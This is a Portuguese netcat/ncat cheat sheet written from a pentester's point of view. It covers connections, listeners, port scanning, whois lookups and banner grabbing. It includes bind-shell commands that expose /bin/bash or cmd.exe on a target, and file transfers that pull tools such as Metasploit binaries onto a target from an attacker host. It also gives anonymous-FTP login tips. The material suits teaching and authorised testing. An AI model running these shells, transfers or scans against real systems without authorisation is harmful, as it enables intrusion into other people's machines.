---
id: netcat
title: netcat
---

O utilitário `nc` (ou netcat) é usado para quase tudo sob o sol envolvendo
soquetes de domínio TCP, UDP ou UNIX. Ele pode abrir conexões TCP, enviar
pacotes UDP, escutar em portas TCP e UDP arbitrárias, fazer varredura de portas
e lidar com IPv4 e IPv6. Ao contrário do `telnet`, o `nc` faz scripts bem e
separa as mensagens de erro no erro padrão, em vez de enviá-las para a saída
padrão, como o `telnet` faz com alguns.

Os usos comuns incluem:

- Proxies TCP simples;
- Clientes e servidores HTTP baseados em shell-script;
- Teste de daemon de rede;
- SOCKS ou HTTP ProxyCommand para SSH;
- E muito, muito mais...

---

## Conectando

Abaixo temos o uso básico do `nc`, utilizando por padrão o protocolo TCP:

```bash
nc 172.16.1.4 110
```

Em alguns casos procisamos de mais informação, por exemplo que a conexão foi
estabelecida e para isso utilizamos o modo verboso passando o argumento `-v`:

```bash
nc -v 172.16.1.4
```

Para efetuar conexões utilizando o protocolo UDP basta utilizar o argumento
`-u`:

```bash
nc -u 127.0.0.1 9000
```

## Escutando

É possível expor uma porta para conexão utilizando o `nc`, porém parece não ser
muito funcional se não utilizado para expor uma shell ou para transferir
arquivos, contudo esse modo pode ser útil para validar portas abertas no
firewall, onde exponho uma porta e verifico se o firewall permite acesso à ela.
Para expor essa porta no alvo utilizamos o argumento `-l`:

```bash
nc -vl 5050
```

Depois podemos utilizar o comando `netstat` para verificar o estado da porta no
sistema alvo:

```bash
netstat -nlpt
```  

Para portas UDP basta utilizar o argumento `-u`:

```bash
nc -vlu 9000
```

## Transferência de arquivo

A transferência de arquivo é muito importante porque o `nc` não possui a função
de expor uma shell, porém o pacote `ncat`, mantido pelo projeto do `nmap`,
possui essa função muito útil. Além disso em muitos momentos temos a necessidade
de subir binários gerados pelo `metasploit` com a intenção de persistir uma
shell ou até mesmo alguns scripts como o `linPEAS` para enumeração.

Para a transferência de arquivos uilizando o `nc` temos dois cenários, um onde o
servidor alvo espera a conexão e no outro caso onde o servidor alvo faz uma
conexão, abaixo teremos os dois exemplos.

### Alvo ← Atacante (Upload)

No servidor alvo:

```bash
nc -lv 5050 > ncat
```

No sistema do atacante:

```bash
nc -v 172.16.2.6 5050 < ncat
```

### Alvo → Atacante (Download)

No sistema do atacante:

```bash
nc -lv 5050 < ncat
```

No servidor alvo:

```bash
nc -v 172.16.2.5 > ncat
```

## Enviando `stdout` para Conexão

Nesse exemplo vamos enviar o output de algum comando via `ncat`.

```bash
nc -lv 5050 < <(cat /etc/os-release)
```

Quando fizermos a conexão na porta 5050 iremos receber a saída do comando
`cat /etc/os-release`:

```bash
$ nc -v 127.0.0.1 5050
Connection to 127.0.0.1 5050 port [tcp/*] succeeded!
PRETTY_NAME="Ubuntu 22.04.4 LTS"
NAME="Ubuntu"
VERSION_ID="22.04"
VERSION="22.04.4 LTS (Jammy Jellyfish)"
VERSION_CODENAME=jammy
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=jammy
```

## Expondo Shell

Expondo shell no Linux:

```bash
ncat -vnlp 5050 -e /bin/bash
```

Expondo shell no Windows:

```bash
ncat -vnlp 5050 -e cmd.exe
```

:::info
Os dois comandos acima são um modelo de shell simples onde devem ser executadas
na máquina alvo.  
Note também que estamos utilizando o `ncat` ao invés do `nc`, sendo que o
primeiro possui mais funções.
:::

Após obter a shell com o `ncat`, podemos chamar um pseudo terminal usando
Python, onde irá melhorar considerávelmente a shell:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

## Escaneando Portas

Para escanear uma porta específica basta utilizar o argumento `-z`:

```bash
nc -vnz 172.16.1.5 22
```

Escaneando um range de portas:

```bash
nc -vnz 172.16.1.5 19-30
```

:::info
Será escaneado da porta 19 até a porta 30.
:::  

Podemos também especificar o *timeout* para cada porta com o argumento `-w`:

```bash
nc -vnz -w2 172.16.1.5 22
```

:::info
Será escaneado levando em consideração um *timeout* de 2 segundos (`-w2`).
:::

Escaneando portas UDP com o argumento `-u`:

```bash
nc -vnzu 172.16.1.5 22
```

## Whois

Com o `nc`também é capaz de fazer pesquisas de domínio diretamente no
registro.br:

```bash
echo "uol.com.br" | nc registro.br 43
```

:::caution
O **registro.br** aceita somentes domínios, ASNs e blocos de IPs brasileiros.  
Para verificação extrangeira utilize o **whois.internic.net**:

```bash
echo "domain google.com" | nc whois.internic.net 43
```

:::

## Banner Grabbing

### HTTP

```bash
$ nc -vn www.alvo.com 80
HEAD / HTTP/1.0
```

### FTP

```bash
$ nc -v 192.168.1.100 21
USER anonymous
PASS anonymous
```

:::info
Sempre teste com usuário `anonymous` e senha `anonymous`.  
Caso o login tenha sido aceito, será retornado o código `230 Login successful`.
:::

:::info
Servidor de teste:

**Domain:** ftp.dlptest.com  
**User:** dlpuser  
**Password:** rNrKYTX9g7z3RgJRmxWuGHbeu

[https://dlptest.com/ftp-test/](https://dlptest.com/ftp-test/)
:::
